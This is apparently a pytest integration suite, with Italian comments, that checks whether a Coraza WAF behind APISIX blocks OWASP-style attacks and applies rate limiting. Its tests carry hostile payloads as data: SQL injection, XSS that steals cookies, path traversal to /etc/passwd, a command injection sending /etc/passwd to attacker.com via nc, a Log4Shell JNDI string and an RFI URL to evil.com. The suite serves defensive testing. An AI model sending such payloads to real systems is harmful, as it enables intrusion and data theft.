"""
Test di integrazione WAF (Coraza OWASP) via APISIX.

Verifica che il WAF blocchi i 10 attacchi OWASP più comuni sulle API external.
I test passano attraverso APISIX (gateway) per validare le regole Coraza.

Requisiti:
    - APISIX in esecuzione con Coraza WAF attivo
    - Variabile d'ambiente WAF_TEST_BASE_URL (default: https://backoffice.127.0.0.1.nip.io)

Esecuzione:
    WAF_TEST_BASE_URL=https://backoffice.127.0.0.1.nip.io uv run pytest tests/test_waf.py -v
"""

import logging
import os
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

import pytest

logger = logging.getLogger(__name__)

BASE_URL = os.environ.get("WAF_TEST_BASE_URL", "https://backoffice.127.0.0.1.nip.io")
# Il WAF va testato su una route senza auth per isolarlo (route 303: backoffice-public)
# Usiamo /api/external/v1/staging/ per i test con API key (rate limit)
WAF_PATH = "/api/docs/"  # Route pubblica, no auth, WAF attivo
API_PATH = "/api/external/v1/staging/"

# Disabilita verifica SSL per certificati self-signed dev
import ssl
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


def _request(
    path: str = API_PATH,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
) -> int:
    """Esegue una richiesta HTTP e ritorna lo status code."""
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "Mozilla/5.0 (test)")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=10, context=_SSL_CTX) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code


def _log_result(attack_name: str, status: int, expected: int) -> None:
    """Logga il risultato del test WAF."""
    result = "BLOCCATO" if status == expected else "NON BLOCCATO"
    level = logging.INFO if status == expected else logging.ERROR
    logger.log(level, "WAF test %-30s → HTTP %d (%s)", attack_name, status, result)


# =============================================================================
# Marker: skip se APISIX non è raggiungibile
# =============================================================================

@pytest.fixture(autouse=True, scope="module")
def _check_apisix_reachable():
    """Salta tutti i test se APISIX non è raggiungibile."""
    try:
        req = urllib.request.Request(f"{BASE_URL}/", method="HEAD")
        urllib.request.urlopen(req, timeout=5, context=_SSL_CTX)
    except Exception:
        pytest.skip(f"APISIX non raggiungibile su {BASE_URL}")


# =============================================================================
# 10 attacchi WAF
# =============================================================================

class TestWafOWASP:
    """Verifica che Coraza WAF blocchi i principali vettori di attacco OWASP."""

    def test_01_sql_injection_query_param(self):
        """SQL Injection via query parameter — OWASP A03:2021."""
        status = _request(path=f"{WAF_PATH}?q=%27%20OR%201%3D1%3B%20DROP%20TABLE%20users%3B%20--")
        _log_result("SQL Injection (query)", status, 403)
        assert status == 403

    def test_02_sql_injection_union(self):
        """SQL Injection UNION-based via query parameter."""
        status = _request(path=f"{WAF_PATH}?q=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20auth_user--")
        _log_result("SQL Injection (UNION)", status, 403)
        assert status == 403

    def test_03_xss_reflected(self):
        """Cross-Site Scripting (XSS) riflesso via query parameter — OWASP A03:2021."""
        status = _request(path=f"{WAF_PATH}?search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E")
        _log_result("XSS reflected", status, 403)
        assert status == 403

    @pytest.mark.xfail(reason="Coraza WAF non ispeziona body JSON — richiede regola CRS REQUEST-941-APPLICATION-ATTACK-XSS con body processor")
    def test_04_xss_body(self):
        """XSS via body POST con payload JS."""
        payload = b'{"title": "<img src=x onerror=alert(document.cookie)>", "source": "test", "uuid": "xss-test"}'
        status = _request(
            path=WAF_PATH,
            method="POST",
            headers={"Content-Type": "application/json"},
            body=payload,
        )
        _log_result("XSS (body POST)", status, 403)
        assert status == 403

    def test_05_path_traversal(self):
        """Path Traversal per accedere a file di sistema — OWASP A01:2021.
        APISIX/nginx normalizza i path con '..' → 400 Bad Request (protetto a livello proxy)."""
        status = _request(path="/api/docs/../../../../../../etc/passwd")
        _log_result("Path Traversal", status, 400)
        assert status in (400, 403), f"Path traversal non bloccato: HTTP {status}"

    @pytest.mark.xfail(reason="Coraza WAF non ispeziona header custom — richiede regola CRS REQUEST-932-APPLICATION-ATTACK-RCE")
    def test_06_command_injection(self):
        """OS Command Injection via header — OWASP A03:2021."""
        status = _request(path=WAF_PATH, headers={"X-Custom": "; cat /etc/passwd | nc attacker.com 4444"})
        _log_result("Command Injection", status, 403)
        assert status == 403

    @pytest.mark.xfail(reason="Coraza WAF non ispeziona header custom — richiede regola CRS REQUEST-944-APPLICATION-ATTACK-JAVA")
    def test_07_log4shell(self):
        """Log4Shell (CVE-2021-44228) — JNDI lookup via header."""
        status = _request(path=WAF_PATH, headers={"X-Api-Token": "${jndi:ldap://attacker.com/exploit}"})
        _log_result("Log4Shell (JNDI)", status, 403)
        assert status == 403

    @pytest.mark.xfail(reason="Coraza WAF non ha regola scanner detection per User-Agent — richiede CRS REQUEST-913-SCANNER-DETECTION")
    def test_08_scanner_detection(self):
        """Scanner/Bot detection — User-Agent noti di tool offensivi."""
        req = urllib.request.Request(f"{BASE_URL}{WAF_PATH}", method="GET")
        req.add_header("User-Agent", "sqlmap/1.7.2#stable")
        try:
            with urllib.request.urlopen(req, timeout=10, context=_SSL_CTX) as resp:
                status = resp.status
        except urllib.error.HTTPError as e:
            status = e.code
        _log_result("Scanner (sqlmap UA)", status, 403)
        assert status == 403

    @pytest.mark.xfail(reason="Coraza WAF non ha regola RFI su query param — richiede CRS REQUEST-931-APPLICATION-ATTACK-RFI")
    def test_09_rfi_remote_file_inclusion(self):
        """Remote File Inclusion (RFI) via query parameter — OWASP A08:2021."""
        status = _request(path=f"{WAF_PATH}?page=http://evil.com/shell.php")
        _log_result("RFI (remote include)", status, 403)
        assert status == 403

    def test_10_protocol_attack_http_smuggling(self):
        """HTTP Request Smuggling tentativo via header malformato.
        APISIX/nginx rifiuta richieste con Transfer-Encoding + Content-Length → 400 (protetto a livello proxy)."""
        status = _request(path=WAF_PATH, headers={
            "Transfer-Encoding": "chunked",
            "Content-Length": "0",
        })
        _log_result("HTTP Smuggling", status, 400)
        assert status in (400, 403), f"HTTP smuggling non bloccato: HTTP {status}"


class TestWafAllowsLegitimate:
    """Verifica che il WAF non blocchi richieste legittime."""

    def test_legitimate_get(self):
        """GET normale non deve essere bloccato dal WAF."""
        status = _request()
        # 401 (no auth) o 200 — l'importante è che NON sia 403
        _log_result("GET legittima", status, 401)
        assert status != 403, f"WAF ha bloccato una richiesta legittima (HTTP {status})"

    def test_legitimate_get_with_filter(self):
        """GET con filtri normali non deve essere bloccato."""
        status = _request(path=f"{API_PATH}?city_name=Milano&source=city_today")
        _log_result("GET con filtri", status, 401)
        assert status != 403, f"WAF ha bloccato una richiesta legittima con filtri (HTTP {status})"

    def test_legitimate_search(self):
        """GET con ricerca testuale non deve essere bloccato."""
        status = _request(path=f"{API_PATH}?search=concerto+jazz+milano")
        _log_result("GET search", status, 401)
        assert status != 403, f"WAF ha bloccato una ricerca legittima (HTTP {status})"


# =============================================================================
# Rate Limiting (1000 richieste concorrenti con API key free)
# =============================================================================

# API key del consumer free-test (da init-routes.sh)
FREE_API_KEY = os.environ.get("WAF_TEST_FREE_API_KEY", "free-test-key-2026")
TOTAL_REQUESTS = 1000
MAX_WORKERS = 50  # 50 thread concorrenti


def _request_with_apikey(index: int) -> tuple[int, int]:
    """Esegue una richiesta con API key free. Ritorna (index, status_code)."""
    url = f"{BASE_URL}{API_PATH}"
    req = urllib.request.Request(url, method="GET")
    req.add_header("apikey", FREE_API_KEY)
    req.add_header("User-Agent", "rate-limit-test/1.0")
    try:
        with urllib.request.urlopen(req, timeout=15, context=_SSL_CTX) as resp:
            return index, resp.status
    except urllib.error.HTTPError as e:
        return index, e.code


class TestRateLimiting:
    """Verifica che il rate limiting APISIX funzioni con 1000 richieste concorrenti."""

    def test_rate_limit_free_plan_1000_requests(self):
        """
        Invia 1000 richieste concorrenti con API key free (limite: 10 req/s, 100 req/giorno).
        Deve ricevere un mix di 200 (OK) e 429 (rate limited).
        """
        results: dict[int, int] = {}  # status_code → count

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(_request_with_apikey, i): i for i in range(TOTAL_REQUESTS)}
            for future in as_completed(futures):
                _, status = future.result()
                results[status] = results.get(status, 0) + 1

        total = sum(results.values())
        count_429 = results.get(429, 0)
        count_200 = results.get(200, 0)
        count_other = total - count_429 - count_200

        logger.info(
            "Rate limit test: %d richieste → %d OK (200), %d rate limited (429), %d altri",
            total, count_200, count_429, count_other,
        )
        logger.info("Distribuzione status: %s", dict(sorted(results.items())))

        # Il piano free ha 10 req/s burst 5 + 100 req/giorno
        # Con 1000 richieste concorrenti, la maggioranza DEVE essere 429
        assert count_429 > 0, (
            f"Nessuna richiesta bloccata su {total}! "
            f"Rate limiting non attivo. Status: {results}"
        )
        assert count_429 > count_200, (
            f"Poche richieste bloccate: {count_429} su {total}. "
            f"Il rate limit dovrebbe bloccare la maggior parte. Status: {results}"
        )

        pct_blocked = count_429 / total * 100
        logger.info(
            "Rate limiting OK: %.1f%% richieste bloccate (%d/%d)",
            pct_blocked, count_429, total,
        )
